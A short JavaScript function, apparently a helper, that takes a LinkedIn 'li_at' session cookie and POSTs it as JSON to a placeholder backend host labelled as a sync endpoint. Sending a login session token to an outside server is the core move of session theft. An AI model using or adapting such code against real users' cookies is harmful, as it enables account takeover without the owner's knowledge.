async function syncLinkedInCookie(liAt) {
  const body = { li_at: liAt };
  const init = { method: 'POST', body: JSON.stringify(body) };
  await fetch('https://backend.example.test/sync', init);
}
